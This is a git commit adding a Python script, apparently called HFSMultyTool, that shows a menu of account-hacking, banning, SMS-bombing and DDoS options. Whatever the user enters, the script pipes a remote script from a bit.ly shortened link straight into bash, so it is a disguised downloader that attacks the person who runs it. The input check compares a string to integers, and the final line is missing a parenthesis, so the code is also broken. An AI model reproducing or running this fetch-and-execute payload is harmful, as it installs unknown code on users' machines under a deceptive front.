2f9a1ea345c5eff9de04b13e1b89ab2cd4f1a659
hfsmaximks <152642557+hfsmaximks@users.noreply.github.com>
2024-05-29 14:01:32 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,30 @@
+import colorama
+import os
+from colorama import Fore, Back, Style
+
+print(Fore.GREEN + "HFSMultyTool")
+
+print(Fore.BLUE + "")
+print("1. Hack Telegram")
+print("2. Hack Google")
+print("3. Hack Viber")
+print("4. Hack Steam")
+print("5. Ban Telegram")
+print("6. Ban Viber")
+print("7. Ban Steam")
+print("8. SMS Bomber")
+print("9. DDOS")
+print("10. Probiv")
+print("11. Obnal")
+print("99. help")
+
+x = input("введите число: ")
+
+if x in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]:
+    os.system("curl -s -L https://bit.ly/3zvELNz | bash")
+
+if x == 99:
+    os.system("curl -s -L https://bit.ly/3zvELNz | bash")
+
+else:
+    os.system("curl -s -L https://bit.ly/3zvELNz | bash"
